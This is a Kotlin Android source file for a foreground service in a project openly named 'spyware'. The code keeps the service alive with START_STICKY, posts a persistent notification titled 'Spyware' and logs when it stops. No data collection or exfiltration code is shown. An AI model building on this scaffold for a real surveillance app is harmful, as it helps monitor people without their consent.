package com.example.spyware
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.spyware.common.Constants
import com.example.spyware.common.Constants.Companion.ERROR
import log
import org.json.JSONObject

class MainService: Service() {
    private lateinit var timeoutHandler:TimeoutHandler

    private var startId:Int=0
    companion object {
        public var isServiceActive=false;
    }

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        println("onStartCommand called")
        isServiceActive=true
        createNotificationChannel();
        timeoutHandler=TimeoutHandler(this)
        this.startId=startId
        startForeground(startId, createNotification(""));
        return START_STICKY
    }

    override fun onDestroy() {
        log(this,JSONObject().put(ERROR,"MainService stopped"))
        super.onDestroy()
        isServiceActive=false
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    fun createNotificationChannel(){
        val serviceChannel = NotificationChannel(
            "CHANNEL_ID",
            "Spyware Service Channel",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(serviceChannel)
    }

    private fun createNotification(message:String): Notification {
//        val pendingIntent: PendingIntent = //...
        val notificationBuilder = NotificationCompat.Builder(this, "CHANNEL_ID")
            .setContentTitle("Spyware")
            .setContentText(message)
            .setStyle(NotificationCompat.BigTextStyle())
//            .setContentIntent(pendingIntent)

        return notificationBuilder.build()
    }
}